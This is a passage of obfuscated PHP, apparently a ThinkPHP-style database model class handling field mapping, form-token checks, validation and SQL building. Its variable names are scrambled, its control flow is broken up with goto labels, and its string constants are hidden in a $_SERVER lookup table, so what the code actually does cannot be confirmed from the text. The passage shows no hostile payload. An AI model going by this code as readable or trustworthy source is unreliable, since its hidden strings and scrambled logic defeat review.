json_encode($c¬ÄÒŠÖîÙ); case $f’Û½ØÆ¦[279]: return xml_encode($c¬ÄÒŠÖîÙ); } } return $c¬ÄÒŠÖîÙ; } public function parseFieldsMap($BâÈ…¤‚Œ, $BÖìäØˆÒŠ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $EŒ‘­ƒ‹õ => $F×ñ·¸†óİ) { if ($BÖìäØˆÒŠ == 1) { if (isset($BâÈ…¤‚Œ[$F×ñ·¸†óİ])) { $BâÈ…¤‚Œ[$EŒ‘­ƒ‹õ] = $BâÈ…¤‚Œ[$F×ñ·¸†óİ]; unset($BâÈ…¤‚Œ[$F×ñ·¸†óİ]); } } else { if (isset($BâÈ…¤‚Œ[$EŒ‘­ƒ‹õ])) { $BâÈ…¤‚Œ[$F×ñ·¸†óİ] = $BâÈ…¤‚Œ[$EŒ‘­ƒ‹õ]; unset($BâÈ…¤‚Œ[$EŒ‘­ƒ‹õ]); } } } } return $BâÈ…¤‚Œ; } public function setField($FôÊí®¯ÉÚ, $bì‡ºá±Ğ¾ = '') { if (is_array($FôÊí®¯ÉÚ)) { $b³æ›«İ³ğ = $FôÊí®¯ÉÚ; } else { $b³æ›«İ³ğ[$FôÊí®¯ÉÚ] = $bì‡ºá±Ğ¾; } return $this->save($b³æ›«İ³ğ); } public function setAdd($F˜„½‚çÂ, $eßä±ÎÖê = 1) { $A²¹ÌÓÉÄå =& $_SERVER[»„]; $b¹ŒÎœ† = $F˜„½‚çÂ . $A²¹ÌÓÉÄå[280] . $eßä±ÎÖê; if ($eßä±ÎÖê < 0) { $b¹ŒÎœ† = $F˜„½‚çÂ . $eßä±ÎÖê; } return $this->setField($F˜„½‚çÂ, array($A²¹ÌÓÉÄå[281], $b¹ŒÎœ†)); } public function getField($B¬êáÌó¯Ì, $eÙéæØÊ…Â = null) { $EÕ…‡…¸ =& $_SERVER[»„]; $cÃçóÅ¬ØÌ[$EÕ…‡…¸[257]] = $B¬êáÌó¯Ì; $cÃçóÅ¬ØÌ = $this->_parseOptions($cÃçóÅ¬ØÌ); $B¬êáÌó¯Ì = trim($B¬êáÌó¯Ì); if (strpos($B¬êáÌó¯Ì, $EÕ…‡…¸[47])) { if (!isset($cÃçóÅ¬ØÌ[$EÕ…‡…¸[276]])) { $cÃçóÅ¬ØÌ[$EÕ…‡…¸[276]] = is_numeric($eÙéæØÊ…Â) ? $eÙéæØÊ…Â : $EÕ…‡…¸[33]; } $bèÑ®ò‘§˜ = $this->db->select($cÃçóÅ¬ØÌ); if (!empty($bèÑ®ò‘§˜)) { goto E¡Ë´‰¸; E¡Ë´‰¸: $DÓëÍ¦èˆ = explode($EÕ…‡…¸[47], $B¬êáÌó¯Ì); $B¬êáÌó¯Ì = array_keys($bèÑ®ò‘§˜[0]); $CƒñùÈ’ÍÁ = array_shift($B¬êáÌó¯Ì); goto cæÒ¸éÊ§²; cæÒ¸éÊ§²: $F§Ïù«Î³ê = array_shift($B¬êáÌó¯Ì); $B½¿•¬¾©± = array(); $b’…ó±ï¤ = count($DÓëÍ¦èˆ); goto cëÏÀîâ; cëÏÀîâ: foreach ($bèÑ®ò‘§˜ as $dâ¢ˆÙŒ¶) { $c¸Æ´æ×Çˆ = $dâ¢ˆÙŒ¶[$CƒñùÈ’ÍÁ]; if (2 == $b’…ó±ï¤) { $B½¿•¬¾©±[$c¸Æ´æ×Çˆ] = $dâ¢ˆÙŒ¶[$F§Ïù«Î³ê]; } else { $B½¿•¬¾©±[$c¸Æ´æ×Çˆ] = is_string($eÙéæØÊ…Â) ? implode($eÙéæØÊ…Â, $dâ¢ˆÙŒ¶) : $dâ¢ˆÙŒ¶; } } return $B½¿•¬¾©±; goto cä¹ÛÉ×É; cä¹ÛÉ×É: } } else { if (!0 !== $eÙéæØÊ…Â) { $cÃçóÅ¬ØÌ[$EÕ…‡…¸[276]] = is_numeric($eÙéæØÊ…Â) ? $eÙéæØÊ…Â : 1; } if ($eÙéæØÊ…Â === $EÕ…‡…¸[239]) { unset($cÃçóÅ¬ØÌ[$EÕ…‡…¸[276]]); } $dâ¢ˆÙŒ¶ = $this->db->select($cÃçóÅ¬ØÌ); if (!empty($dâ¢ˆÙŒ¶)) { if ($eÙéæØÊ…Â === $EÕ…‡…¸[239]) { return reset($dâ¢ˆÙŒ¶[0]); } if (!0 !== $eÙéæØÊ…Â && 1 == $cÃçóÅ¬ØÌ[$EÕ…‡…¸[276]]) { return reset($dâ¢ˆÙŒ¶[0]); } foreach ($dâ¢ˆÙŒ¶ as $E‚Ê¥òºÖ) { $Aî•ÏÀÜ£[] = $E‚Ê¥òºÖ[$B¬êáÌó¯Ì]; } return $Aî•ÏÀÜ£; } } return null; } public function create($e‚‰šÌÉ¥Ê = '', $C’°à…Ô›¼ = '') { goto bê»„èæ¥İ; bê»„èæ¥İ: $FÉ®¶ºŠôÂ =& $_SERVER[»„]; if (empty($e‚‰šÌÉ¥Ê)) { $e‚‰šÌÉ¥Ê = $_POST; } elseif (is_object($e‚‰šÌÉ¥Ê)) { $e‚‰šÌÉ¥Ê = get_object_vars($e‚‰šÌÉ¥Ê); } if (empty($e‚‰šÌÉ¥Ê) || !is_array($e‚‰šÌÉ¥Ê)) { $this->error = think_lang($FÉ®¶ºŠôÂ[255]); return !1; } goto c ‡­¢ŠŒ; Eç¥³…ì¨¤: if (isset($a‚ª…´ñë¾)) { if (is_string($a‚ª…´ñë¾)) { $a‚ª…´ñë¾ = explode($FÉ®¶ºŠôÂ[47], $a‚ª…´ñë¾); } if (think_config($FÉ®¶ºŠôÂ[282])) { $a‚ª…´ñë¾[] = think_config($FÉ®¶ºŠôÂ[283]); } foreach ($e‚‰šÌÉ¥Ê as $B÷ÓÚÓšÏ => $c‰È¨‰´¼ø) { if (!in_array($B÷ÓÚÓšÏ, $a‚ª…´ñë¾)) { unset($e‚‰šÌÉ¥Ê[$B÷ÓÚÓšÏ]); } } } if (!$this->autoValidation($e‚‰šÌÉ¥Ê, $C’°à…Ô›¼)) { return !1; } if (!$this->autoCheckToken($e‚‰šÌÉ¥Ê)) { $this->error = think_lang($FÉ®¶ºŠôÂ[284]); return !1; } goto d©Æ¥†¾»®; d©Æ¥†¾»®: if ($this->autoCheckFields) { $a‚ª…´ñë¾ = $this->getDbFields(); foreach ($e‚‰šÌÉ¥Ê as $B÷ÓÚÓšÏ => $c‰È¨‰´¼ø) { if (!in_array($B÷ÓÚÓšÏ, $a‚ª…´ñë¾)) { unset($e‚‰šÌÉ¥Ê[$B÷ÓÚÓšÏ]); } elseif (MAGIC_QUOTES_GPC && is_string($c‰È¨‰´¼ø)) { $e‚‰šÌÉ¥Ê[$B÷ÓÚÓšÏ] = stripslashes($c‰È¨‰´¼ø); } } } $this->autoOperation($e‚‰šÌÉ¥Ê, $C’°à…Ô›¼); $this->data = $e‚‰šÌÉ¥Ê; goto c÷‰‹õŠµ¾; c ‡­¢ŠŒ: $e‚‰šÌÉ¥Ê = $this->parseFieldsMap($e‚‰šÌÉ¥Ê, 0); $C’°à…Ô›¼ = $C’°à…Ô›¼ ? $C’°à…Ô›¼ : (!empty($e‚‰šÌÉ¥Ê[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$FÉ®¶ºŠôÂ[257]])) { $a‚ª…´ñë¾ = $this->options[$FÉ®¶ºŠôÂ[257]]; unset($this->options[$FÉ®¶ºŠôÂ[257]]); } elseif ($C’°à…Ô›¼ == THINK_MODEL_INSERT && isset($this->insertFields)) { $a‚ª…´ñë¾ = $this->insertFields; } elseif ($C’°à…Ô›¼ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $a‚ª…´ñë¾ = $this->updateFields; } goto Eç¥³…ì¨¤; c÷‰‹õŠµ¾: return $e‚‰šÌÉ¥Ê; goto DÈ¸„ñ„; DÈ¸„ñ„: } public function autoCheckToken($aÃ¨ÈÃ“Ê¼) { $cÎ»µ‹…î =& $_SERVER[»„]; if (isset($this->options[$cÎ»µ‹…î[285]]) && !$this->options[$cÎ»µ‹…î[285]]) { return !0; } if (think_config($cÎ»µ‹…î[282])) { $BÃ¦ñìË× = think_config($cÎ»µ‹…î[283]); if (!isset($aÃ¨ÈÃ“Ê¼[$BÃ¦ñìË×]) || Session::get($BÃ¦ñìË×)) { return !1; } list($e³Úš°œ×†, $EÉøÄ¡) = explode($cÎ»µ‹…î[70], $aÃ¨ÈÃ“Ê¼[$BÃ¦ñìË×]); if ($EÉøÄ¡ && Session::get($BÃ¦ñìË× . $cÎ»µ‹…î[91] . $e³Úš°œ×†) === $EÉøÄ¡) { Session::remove($BÃ¦ñìË× . $cÎ»µ‹…î[91] . $e³Úš°œ×†); return !0; } if (think_config($cÎ»µ‹…î[286])) { Session::remove($BÃ¦ñìË× . $cÎ»µ‹…î[91] . $e³Úš°œ×†); } return !1; } return !0; } public function regex($eâ¶Û¬”»è, $BÊ»ìÌ÷¨©) { $BìŒ¨çŞÍ =& $_SERVER[»„]; $dóÅŸ‡¡äº = array($BìŒ¨çŞÍ[287] => $BìŒ¨çŞÍ[288], $BìŒ¨çŞÍ[289] => $BìŒ¨çŞÍ[290], $BìŒ¨çŞÍ[291] => $BìŒ¨çŞÍ[292], $BìŒ¨çŞÍ[293] => $BìŒ¨çŞÍ[294], $BìŒ¨çŞÍ[295] => $BìŒ¨çŞÍ[296], $BìŒ¨çŞÍ[297] => $BìŒ¨çŞÍ[298], $BìŒ¨çŞÍ[299] => $BìŒ¨çŞÍ[300], $BìŒ¨çŞÍ[274] => $BìŒ¨çŞÍ[301], $BìŒ¨çŞÍ[302] => $BìŒ¨çŞÍ[303]); if (isset($dóÅŸ‡¡äº[strtolower($BÊ»ìÌ÷¨©)])) { $BÊ»ìÌ÷¨© = $dóÅŸ‡¡äº[strtolower($BÊ»ìÌ÷¨©)]; } return preg_match($BÊ»ìÌ÷¨©, $eâ¶Û¬”»è) === 1; } private function autoOperation(&$c‹‹Õ‚ª©Ú, $fñÏÕ™ãÎí) { $B”´· ß¬¸ =& $_SERVER[»„]; if (!empty($this->options[$B”´· ß¬¸[304]])) { $a‡ğÇ¼«Å¦ = $this->options[$B”´· ß¬¸[304]]; unset($this->options[$B”´· ß¬¸[304]]); } elseif (!empty($this->_auto)) { $a‡ğÇ¼«Å¦ = $this->_auto; } if (isset($a‡ğÇ¼«Å¦)) { foreach ($a‡ğÇ¼«Å¦ as $D»„óä¥¼Æ) { if (empty($D»„óä¥¼Æ[2])) { $D»„óä¥¼Æ[2] = THINK_MODEL_INSERT; } if ($fñÏÕ™ãÎí == $D»„óä¥¼Æ[2] || $D»„óä¥¼Æ[2] == THINK_MODEL_BOTH) { switch (trim($D»„óä¥¼Æ[3])) { case $B”´· ß¬¸[305]: case $B”´· ß¬¸[306]: $BÍ³²•ğ = isset($D»„óä¥¼Æ[4]) ? (array) $D»„óä¥¼Æ[4] : array(); if (isset($c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]])) { array_unshift($BÍ³²•ğ, $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]]); } if ($B”´· ß¬¸[305] == $D»„óä¥¼Æ[3]) { $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]] = call_user_func_array($D»„óä¥¼Æ[1], $BÍ³²•ğ); } else { $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]] = call_user_func_array(array(&$this, $D»„óä¥¼Æ[1]), $BÍ³²•ğ); } break; case $B”´· ß¬¸[257]: $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]] = $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[1]]; break; case $B”´· ß¬¸[307]: if ($B”´· ß¬¸[33] === $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]]) { unset($c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]]); } break; case $B”´· ß¬¸[308]: default: $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]] = $D»„óä¥¼Æ[1]; } if (!1 === $c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]]) { unset($c‹‹Õ‚ª©Ú[$D»„óä¥¼Æ[0]]); } } } } return $c‹‹Õ‚ª©Ú; } protected function autoValidation($bØÒ£‘‘î, $EËğôäÚ•ƒ) { $fÎ¹àÀåÅ² =& $_SERVER[»„]; if (!empty($this->options[$fÎ¹àÀåÅ²[309]])) { $AÉÕ¿Â…¬ñ = $this->options[$fÎ¹àÀåÅ²[309]]; unset($this->options[$fÎ¹àÀåÅ²[309]]); } elseif (!empty($this->_validate)) { $AÉÕ¿Â…¬ñ = $this->_validate; } if (isset($AÉÕ¿Â…¬ñ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AÉÕ¿Â…¬ñ as $D¯ëŠŒÖ‡Ë => $eŒ¢æ§½Õô) { if (empty($eŒ¢æ§½Õô[5]) || $eŒ¢æ§½Õô[5] == THINK_MODEL_BOTH || $eŒ¢æ§½Õô[5] == $EËğôäÚ•ƒ) { if (0 == strpos($eŒ¢æ§½Õô[2], $fÎ¹àÀåÅ²[310]) && strpos($eŒ¢æ§½Õô[2], $fÎ¹àÀåÅ²[311])) { $eŒ¢æ§½Õô[2] = think_lang(substr($eŒ¢æ§½Õô[2], 2, -1)); } $eŒ¢æ§½Õô[3] = isset($eŒ¢æ§½Õô[3]) ? $eŒ¢æ§½Õô[3] : THINK_EXISTS_VALIDATE; $eŒ¢æ§½Õô[4] = isset($eŒ¢æ§½Õô[4]) ? $eŒ¢æ§½Õô[4] : $fÎ¹àÀåÅ²[312]; switch ($eŒ¢æ§½Õô[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($bØÒ£‘‘î, $eŒ¢æ§½Õô)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($fÎ¹àÀåÅ²[33] != trim($bØÒ£‘‘î[$eŒ¢æ§½Õô[0]])) { if (!1 === $this->_validationField($bØÒ£‘‘î, $eŒ¢æ§½Õô)) { return !1; } } break; default: if (isset($bØÒ£‘‘î[$eŒ¢æ§½Õô[0]])) { if (!1 === $this->_validationField($bØÒ£‘‘î, $eŒ¢æ§½Õô)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($E§ÇÜö¸ğÖ, $eÜ³ÀôëãØ) { if (!1 === $this->_validationFieldItem($E§ÇÜö¸ğÖ, $eÜ³ÀôëãØ)) { if ($this->patchValidate) { $this->error[$eÜ³ÀôëãØ[0]] = $eÜ³ÀôëãØ[2]; } else { $this->error = $eÜ³ÀôëãØ[2]; return !1; } } return; } protected function _validationFieldItem($B÷ƒ­†Íˆ, $ağğœ›ñÁ) { $DÇôœ¥òéí =& $_SERVER[»„]; switch (strtolower(trim($ağğœ›ñÁ[4]))) { case $DÇôœ¥òéí[305]: case $DÇôœ¥òéí[306]: $b¥Ù˜ëÖ°— = isset($ağğœ›ñÁ[6]) ? (array) $ağğœ›ñÁ[6] : array(); if (is_string($ağğœ›ñÁ[0]) && strpos($ağğœ›ñÁ[0], $DÇôœ¥òéí[47])) { $ağğœ›ñÁ[0] = explode($DÇôœ¥òéí[47], $ağğœ›ñÁ[0]); } if (is_array($ağğœ›ñÁ[0])) { foreach ($ağğœ›ñÁ[0] as $EòÓùğ£½˜) { $AÂ‡Ê›‚[$EòÓùğ£½˜] = $B÷ƒ­†Íˆ[$EòÓùğ£½˜]; } array_unshift($b¥Ù˜ëÖ°—, $AÂ‡Ê›‚); } else { array_unshift($b¥Ù˜ëÖ°—, $B÷ƒ­†Íˆ[$ağğœ›ñÁ[0]]); } if ($DÇôœ¥òéí[305] == $ağğœ›ñÁ[4]) { return call_user_func_array($ağğœ›ñÁ[1], $b¥Ù˜ëÖ°—); } else { return call_user_func_array(array(&$this, $ağğœ›ñÁ[1]), $b¥Ù˜ëÖ°—); } case $DÇôœ¥òéí[313]: return $B÷ƒ­†Íˆ[$ağğœ›ñÁ[0]] == $B÷ƒ­†Íˆ[$ağğœ›ñÁ[1]]; case $DÇôœ¥òéí[314]: if (is_string($ağğœ›ñÁ[0]) && strpos($ağğœ›ñÁ[0], $DÇôœ¥òéí[47])) { $ağğœ›ñÁ[0] = explode($DÇôœ¥òéí[47], $ağğœ›ñÁ[0]); } $E®«‹‰•ˆÉ = array(); if (is_array($ağğœ›ñÁ[0])) { foreach ($ağğœ›ñÁ[0] as $EòÓùğ£½˜) { $E®«‹‰•ˆÉ[$EòÓùğ£½˜] = $B÷ƒ­†Íˆ[$EòÓùğ£½˜]; } } else { $E®«‹‰•ˆÉ[$ağğœ›ñÁ[0]] = $B÷ƒ­†Íˆ[$ağğœ›ñÁ[0]]; } if (!empty($B÷ƒ­†Íˆ[$this->getPk()])) { $E®«‹‰•ˆÉ[$this->getPk()] = array($DÇôœ¥òéí[315], $B÷ƒ­†Íˆ[$this->getPk()]); } if ($this->where($E®«‹‰•ˆÉ)->find()) { return !1; } return !0; default: return $this->check($B÷ƒ­†Íˆ[$ağğœ›ñÁ[0]], $ağğœ›ñÁ[1], $ağğœ›ñÁ[4]); } } public function check($E‹†ô¶¡Ó, $eÓ…ğØ‹íÈ, $Aƒ½Ãì¹ÕŸ = "\162\145\147\145\170") { $BÖ³§ñôÈ =& $_SERVER[»„]; $Aƒ½Ãì¹ÕŸ = strtolower(trim($Aƒ½Ãì¹ÕŸ)); switch ($Aƒ½Ãì¹ÕŸ) { case $BÖ³§ñôÈ[7]: case $BÖ³§ñôÈ[316]: $CÊŠˆ“­¡Î = is_array($eÓ…ğØ‹íÈ) ? $eÓ…ğØ‹íÈ : explode($BÖ³§ñôÈ[47], $eÓ…ğØ‹íÈ); return $Aƒ½Ãì¹ÕŸ == $BÖ³§ñôÈ[7] ? in_array($E‹†ô¶¡Ó, $CÊŠˆ“­¡Î) : !in_array($E‹†ô¶¡Ó, $CÊŠˆ“­¡Î); case $BÖ³§ñôÈ[317]: case $BÖ³§ñôÈ[318]: if (is_array($eÓ…ğØ‹íÈ)) { $a¦áš‚·¢ = $eÓ…ğØ‹íÈ[0]; $cõã­µ†óÚ = $eÓ…ğØ‹íÈ[1]; } else { list($a¦áš‚·¢, $cõã­µ†óÚ) = explode($BÖ³§ñôÈ[47], $eÓ…ğØ‹íÈ); } return $Aƒ½Ãì¹ÕŸ == $BÖ³§ñôÈ[317] ? $E‹†ô¶¡Ó >= $a¦áš‚·¢ && $E‹†ô¶¡Ó <= $cõã­µ†óÚ : $E‹†ô¶¡Ó < $a¦áš‚·¢ || $E‹†ô¶¡Ó > $cõã­µ†óÚ; case $BÖ³§ñôÈ[319]: case $BÖ³§ñôÈ[320]: return $Aƒ½Ãì¹ÕŸ == $BÖ³§ñôÈ[319] ? $E‹†ô¶¡Ó == $eÓ…ğØ‹íÈ : $E‹†ô¶¡Ó != $eÓ…ğØ‹íÈ; case $BÖ³§ñôÈ[321]: $BíÛµÃ¡Î» = mb_strlen($E‹†ô¶¡Ó, $BÖ³§ñôÈ[322]); if (strpos($eÓ…ğØ‹íÈ, $BÖ³§ñôÈ[47])) { list($a¦áš‚·¢, $cõã­µ†óÚ) = explode($BÖ³§ñôÈ[47], $eÓ…ğØ‹íÈ); return $BíÛµÃ¡Î» >= $a¦áš‚·¢ && $BíÛµÃ¡Î» <= $cõã­µ†óÚ; } else { return $BíÛµÃ¡Î» == $eÓ…ğØ‹íÈ; } case $BÖ³§ñôÈ[323]: list($Eèô¼‹œ÷, $AÁ‡¾›¯Ì©) = explode($BÖ³§ñôÈ[47], $eÓ…ğØ‹íÈ); if (!is_numeric($Eèô¼‹œ÷)) { $Eèô¼‹œ÷ = strtotime($Eèô¼‹œ÷); } if (!is_numeric($AÁ‡¾›¯Ì©)) { $AÁ‡¾›¯Ì© = strtotime($AÁ‡¾›¯Ì©); } return NOW_TIME >= $Eèô¼‹œ÷ && NOW_TIME <= $AÁ‡¾›¯Ì©; case $BÖ³§ñôÈ[324]: return in_array(get_client_ip(), explode($BÖ³§ñôÈ[47], $eÓ…ğØ‹íÈ)); case $BÖ³§ñôÈ[325]: return !in_array(get_client_ip(), explode($BÖ³§ñôÈ[47], $eÓ…ğØ‹íÈ)); case $BÖ³§ñôÈ[312]: default: return $this->regex($E‹†ô¶¡Ó, $eÓ…ğØ‹íÈ); } } public function query($Aë¬Í¹Ÿ´ñ, $aöÙÅ¢“Õß = false) { $BÑò‡£„Øâ =& $_SERVER[»„]; if (!is_bool($aöÙÅ¢“Õß) && !is_array($aöÙÅ¢“Õß)) { $aöÙÅ¢“Õß = func_get_args(); array_shift($aöÙÅ¢“Õß); } $Aë¬Í¹Ÿ´ñ = str_replace(array($BÑò‡£„Øâ[213], $BÑò‡£„Øâ[326]), $BÑò‡£„Øâ[50], $Aë¬Í¹Ÿ´ñ); $Aë¬Í¹Ÿ´ñ = $this->parseSql($Aë¬Í¹Ÿ´ñ, $aöÙÅ¢“Õß); return $this->db->query($Aë¬Í¹Ÿ´ñ); } public function execute($d£’ëÀÅå, $b×—…ŒÜ‚ = false) { if (!is_bool($b×—…ŒÜ‚) && !is_array($b×—…ŒÜ‚)) { $b×—…ŒÜ‚ = func_get_args(); array_shift($b×—…ŒÜ‚); } $d£’ëÀÅå = $this->parseSql($d£’ëÀÅå, $b×—…ŒÜ‚); return $this->db->execute($d£’ëÀÅå); } protected function parseSql($DÅ« ×Ï, $e¯¥Şµ¬) { $f’óÚóÊŸª =& $_SERVER[»„]; if (!0 === $e¯¥Şµ¬) { $A´ñ‚ë˜ö„ = $this->_parseOptions(); $DÅ« ×Ï = $this->db->parseSql($DÅ« ×Ï, $A´ñ‚ë˜ö„); } elseif (is_array($e¯¥Şµ¬)) { $e¯¥Şµ¬ = array_map(array($this->db, $f’óÚóÊŸª[327]), $e¯¥Şµ¬); $DÅ« ×Ï = vsprintf($DÅ« ×Ï, $e¯¥Şµ¬); } else { $DÅ« ×Ï = strtr($DÅ« ×Ï, array($f’óÚóÊŸª[328] => $this->getTableName(), $f’óÚóÊŸª[329] => think_config($f’óÚóÊŸª[228]))); } $this->db->setModel($this->name); return $DÅ« ×Ï; } public function db($f„ÑÖÑÕ¡ = '', $C“˜‘¹šµ = '', $aç ‡ö®Ÿ = array()) { goto FÓ…‹ÔŞ¤Ü; e³Œô—•Á©: static $Eô°°Å‹ñİ = array(); if (!isset($Eô°°Å‹ñİ[$f„ÑÖÑÕ¡]) || isset($Eô°°Å‹ñİ[$f„ÑÖÑÕ¡]) && $C“˜‘¹šµ && $f¾©â×ÕÄ[$f„ÑÖÑÕ¡] != $C“˜‘¹šµ) { if (!empty($C“˜‘¹šµ) && is_string($C“˜‘¹šµ) && !1 === strpos($C“˜‘¹šµ, $fæÕ™Úàí·[8])) { $C“˜‘¹šµ = think_config($C“˜‘¹šµ); } $Eô°°Å‹ñİ[$f„ÑÖÑÕ¡] = Db::getInstance($C“˜‘¹šµ); } elseif (NULL === $C“˜‘¹šµ) { $Eô°°Å‹ñİ[$f„ÑÖÑÕ¡]->close(); unset($Eô°°Å‹ñİ[$f„ÑÖÑÕ¡]); return; } if (!empty($aç ‡ö®Ÿ)) { if (is_string($aç ‡ö®Ÿ)) { parse_str($aç ‡ö®Ÿ, $aç ‡ö®Ÿ); } foreach ($aç ‡ö®Ÿ as $eô“‡Ø“Ç => $B÷ÔËö¶´) { $this->setProperty($eô“‡Ø“Ç, $B÷ÔËö¶´); } } goto a†ìô †; a†ìô †: $f¾©â×ÕÄ[$f„ÑÖÑÕ¡] = $C“˜‘¹šµ; $this->db = $Eô°°Å‹ñİ[$f„ÑÖÑÕ¡]; $this->_after_db(); goto a†‰º¿ô’; FÓ…‹ÔŞ¤Ü: $fæÕ™Úàí· =& $_SERVER[»„]; if ($fæÕ™Úàí·[33] === $f„ÑÖÑÕ¡ && $this->db) { return $this->db; } static $f¾©â×ÕÄ = array(); goto e³Œô—•Á©; a†‰º¿ô’: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto c§Êôîº”ƒ; c§Êôîº”ƒ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Fƒë’Ò¸÷ˆ = get_class($this); if ($Fƒë’Ò¸÷ˆ == $_SERVER[»„][330]) { return $this->name; } $this->name = substr($Fƒë’Ò¸÷ˆ, 0, -5); } return $this->name; } public function getTableName() { $b­ôğå•“ =& $_SERVER[»„]; if (empty($this->trueTableName)) { $bÉÕ¶Ó³õÔ = !empty($this->tablePrefix) ? $this->tablePrefix : $b­ôğå•“[33]; if (!empty($this->tableName)) { $bÉÕ¶Ó³õÔ .= $this->tableName; } else { $bÉÕ¶Ó³õÔ .= think_parse_name($this->name); } $this->trueTableName = strtolower($bÉÕ¶Ó³õÔ); } return (!empty($this->dbName) ? $this->dbName . $b­ôğå•“[91] : $b­ôğå•“[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $D÷»‡ˆ™äš =& $_SERVER[»„]; return isset($this->fields[$D÷»‡ˆ™äš[235]]) ? $this->fields[$D÷»‡ˆ™äš[235]] : $this->pk; } public function getDbFields() { $fŒ•Êã•¡ =& $_SERVER[»„]; if (isset($this->options[$fŒ•Êã•¡[263]])) { $F£†»³‡ = $this->db->getFields($this->options[$fŒ•Êã•¡[263]]); return $F£†»³‡ ? array_keys($F£†»³‡) : !1; } if ($this->fields) { $F£†»³‡ = $this->fields; unset($F£†»³‡[$fŒ•Êã•¡[234]], $F£†»³‡[$fŒ•Êã•¡[235]], $F£†»³‡[$fŒ•Êã•¡[236]], $F£†»³‡[$fŒ•Êã•¡[233]]); return $F£†»³‡; } return !1; } public function data($FºÎ°î = '') { $F´Îâ‰† =& $_SERVER[»„]; if ($F´Îâ‰†[33] === $FºÎ°î && !empty($this->data)) { return $this->data; } if (is_object($FºÎ°î)) { $FºÎ°î = get_object_vars($FºÎ°î); } elseif (is_string($FºÎ°î)) { parse_str($FºÎ°î, $FºÎ°î); } elseif (!is_array($FºÎ°î)) { think_exception(think_lang($F´Îâ‰†[255])); } $this->data = $FºÎ°î; return $this; } public function join($E¾¸¯¸‘±) { $D‹À·¥Œãé =& $_SERVER[»„]; if (is_array($E¾¸¯¸‘±)) { $this->options[$D‹À·¥Œãé[266]] = $E¾¸¯¸‘±; } elseif (!empty($E¾¸¯¸‘±)) { $this->options[$D‹À·¥Œãé[266]][] = $E¾¸¯¸‘±; } return $this; } public function union($a¦‚ö”¨ŞÉ, $Eã­šÅ¯´à = false) { goto f¶è ¶Õî; A´Õ–èò„ˆ: if (is_object($a¦‚ö”¨ŞÉ)) { $a¦‚ö”¨ŞÉ = get_object_vars($a¦‚ö”¨ŞÉ); } if (is_string($a¦‚ö”¨ŞÉ)) { $cÒ•™Û³ª‰ = $a¦‚ö”¨ŞÉ; } elseif (is_array($a¦‚ö”¨ŞÉ)) { if (isset($a¦‚ö”¨ŞÉ[0])) { $this->options[$f¦Ï«Ø»«ß[331]] = array_merge($this->options[$f¦Ï«Ø»«ß[331]], $a¦‚ö”¨ŞÉ); return $this; } else { $cÒ•™Û³ª‰ = $a¦‚ö”¨ŞÉ; } } else { think_exception(think_lang($f¦Ï«Ø»«ß[255])); } $this->options[$f¦Ï«Ø»«ß[331]][] = $cÒ•™Û³ª‰; goto fˆ†æçÓÁ; f¶è ¶Õî: $f¦Ï«Ø»«ß =& $_SERVER[»„]; if (empty($a¦‚ö”¨ŞÉ)) { return $this; } if ($Eã­šÅ¯´à) { $this->options[$f¦Ï«Ø»«ß[331]][$f¦Ï«Ø»«ß[332]] = !0; } goto A´Õ–èò„ˆ; fˆ†æçÓÁ: return $this; goto eš¯Ş‚½¨é; eš¯Ş‚½¨é: } public function cache($C¤°Œİ‹êì = true, $e ğ‰±æ— = null, $f‹Ùõ™Ú©§ = '') { $d¸ä‹ÒÏİ  =& $_SERVER[»„]; if (!1 !== $C¤°Œİ‹êì) { $this->options[$d¸ä‹ÒÏİ [333]] = array($d¸ä‹ÒÏİ [89] => $C¤°Œİ‹êì, $d¸ä‹ÒÏİ [323] => $e ğ‰±æ—, $d¸ä‹ÒÏİ [29] => $f‹Ùõ™Ú©§); } return $this; } public function field($EŒôˆ¯ƒ¥, $céğÏÌšˆ¢ = false) { $dìã¾Å½ëÌ =& $_SERVER[»„]; if (!0 === $EŒôˆ¯ƒ¥) { $CŒŠº”•ù‚ = $this->getDbFields(); $EŒôˆ¯ƒ¥ = $CŒŠº”•ù‚ ? $CŒŠº”•ù‚ : $dìã¾Å½ëÌ[172]; } elseif ($céğÏÌšˆ¢) { if (is_string($EŒôˆ¯ƒ¥)) { $EŒôˆ¯ƒ¥ = explode($dìã¾Å½ëÌ[47], $EŒôˆ¯ƒ¥); } $CŒŠº”•ù‚ = $this->getDbFields(); $EŒôˆ¯ƒ¥ = $CŒŠº”•ù‚ ? array_diff($CŒŠº”•ù‚, $EŒôˆ¯ƒ¥) : $EŒôˆ¯ƒ¥; } $this->options[$dìã¾Å½ëÌ[257]] = $EŒôˆ¯ƒ¥; return $this; } public function scope($CèØ‚½ğéÌ = '', $bˆÛÈî•‘Ö = NULL) { $aÏÉÚ’ßÑ  =& $_SERVER[»„]; if ($aÏÉÚ’ßÑ [33] === $CèØ‚½ğéÌ) { if (isset($this->_scope[$aÏÉÚ’ßÑ [34]])) { $EÚÃ–ö«–É = $this->_scope[$aÏÉÚ’ßÑ [34]]; } else { return $this; } } elseif (is_string($CèØ‚½ğéÌ)) { $Díò—à–Á¡ = explode($aÏÉÚ’ßÑ [47], 